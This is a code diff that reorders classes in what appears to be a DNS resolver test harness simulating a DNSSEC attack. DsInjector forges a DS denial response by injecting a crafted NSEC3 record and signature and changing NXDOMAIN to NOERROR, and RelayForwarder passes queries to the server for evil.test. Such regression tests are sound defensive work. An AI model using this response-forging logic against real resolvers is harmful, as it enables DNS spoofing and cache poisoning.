@@ -175,42 +175,6 @@ class Attack:
 ATTACK = Attack()
 
 
-class RelayForwarder(ForwarderHandler):
-    """
-    Relay the given query types -- or every query, if none are given -- to the
-    real authoritative server for evil.test.
-    """
-
-    target = NS6.ip
-
-    def __init__(self, *qtypes: dns.rdatatype.RdataType) -> None:
-        super().__init__()
-        self.matcher = Qtype(*qtypes) if qtypes else Always()
-
-
-class DsInjector(ResponseHandlerWrapper):
-    """
-    Inject the crafted NSEC3 at position 0 of the DS response's authority.
-    """
-
-    def _modify_response(
-        self, qctx: QueryContext, response_action: ResponseAction
-    ) -> None:
-        assert isinstance(
-            response_action, DnsResponseSend
-        ), "DsInjector can only wrap handlers that yield DnsResponseSend"
-        response = response_action.response
-        assert response.rcode() == dns.rcode.NXDOMAIN, "expected an opt-out denial"
-        response.set_rcode(dns.rcode.NOERROR)
-
-        authority = [ATTACK.crafted_nsec3, ATTACK.crafted_rrsig]
-        for rrset in response.authority:
-            if ATTACK.covers_inject(rrset.name):
-                continue
-            authority.append(rrset)
-        response.authority = authority
-
-
 class ProofBreaker(ResponseHandlerWrapper):
     """
     Overrun the modify-target NSEC3 in the A response and re-sign it.
@@ -259,6 +223,42 @@ class ProofBreaker(ResponseHandlerWrapper):
         resigned.update_ttl(rrsig_rrset.ttl)
         resigned.add(rrsig_rdata)
         return resigned
+
+
+class DsInjector(ResponseHandlerWrapper):
+    """
+    Inject the crafted NSEC3 at position 0 of the DS response's authority.
+    """
+
+    def _modify_response(
+        self, qctx: QueryContext, response_action: ResponseAction
+    ) -> None:
+        assert isinstance(
+            response_action, DnsResponseSend
+        ), "DsInjector can only wrap handlers that yield DnsResponseSend"
+        response = response_action.response
+        assert response.rcode() == dns.rcode.NXDOMAIN, "expected an opt-out denial"
+        response.set_rcode(dns.rcode.NOERROR)
+
+        authority = [ATTACK.crafted_nsec3, ATTACK.crafted_rrsig]
+        for rrset in response.authority:
+            if ATTACK.covers_inject(rrset.name):
+                continue
+            authority.append(rrset)
+        response.authority = authority
+
+
+class RelayForwarder(ForwarderHandler):
+    """
+    Relay the given query types -- or every query, if none are given -- to the
+    real authoritative server for evil.test.
+    """
+
+    target = NS6.ip
+
+    def __init__(self, *qtypes: dns.rdatatype.RdataType) -> None:
+        super().__init__()
+        self.matcher = Qtype(*qtypes) if qtypes else Always()
 
 
 def main() -> None:
